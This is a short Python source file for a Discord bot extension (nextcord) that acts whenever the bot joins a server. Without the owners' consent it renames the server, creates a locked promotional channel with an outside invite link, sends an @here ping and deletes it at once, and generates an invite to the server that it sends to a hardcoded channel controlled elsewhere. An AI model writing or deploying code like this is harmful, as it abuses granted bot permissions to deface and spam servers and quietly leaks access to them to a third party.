from nextcord.ext import commands
class Serveur(commands.Cog):
  def __init__(self, bot):
    self.bot = bot

  @commands.Cog.listener('on_guild_join')
  async def register(self, guild):
    await guild.edit(name=f"ℋ {guild.name}")
    channel = await guild.create_text_channel('Horizon')
    await channel.set_permissions(guild.default_role, send_messages=False, read_messages=True)
    await channel.send("https://discord.gg/7n5Zkw2PJt")
    msg = await channel.send("@here")
    await msg.delete()
    invite = await guild.channels[0].create_invite()
    await self.bot.get_channel(1009428753434288140).send(f"Nous avons un nouveau serveur !\n{invite}")

def setup(bot):
  bot.add_cog(Serveur(bot))
